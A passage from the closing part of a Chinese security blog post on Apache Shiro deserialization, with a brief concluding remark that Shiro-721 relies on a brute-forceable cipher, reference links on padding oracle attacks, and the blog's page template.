+<p>其实 shiro721 并不是 shiro 内部逻辑的问题，而是采用的加密算法是可爆破的，给攻击者提供了一种方式，不过要正常爆破一个可用的 payload，其爆破的数量是庞大的，利用起来还是有一定的被封 ip 的可能</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12148">Java 反序列化之 Shiro 反序列化利用-先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12505">深入探究 Shiro 漏洞成因及攻击技术-先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.javasec.org/java-vuls/shiro/Shiro-1.html">https://www.javasec.org/java-vuls/shiro/Shiro-1.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/217">CBC 字节翻转攻击&amp;Padding Oracle Attack 原理解析 - 枫 のBlog</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/java%E5%AE%89%E5%85%A8/" class="category-chain-item">java安全</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/java%E5%AE%89%E5%85%A8/Shiro/" class="category-chain-item">Shiro</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/java%E5%AE%89%E5%85%A8/" class="print-no-link">#java安全</a>
+      
+        <a href="/tags/Shiro/" class="print-no-link">#Shiro</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Shiro 反序列化</div>
+      <div>http://lingx5.github.io/2025/04/21/Shiro-反序列化/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>lingx5</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年4月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/04/14/struts2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%9612-61/" title="struts2反序列化12-61">
+                        <span class="hidden-mobile">struts2反序列化12-61</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
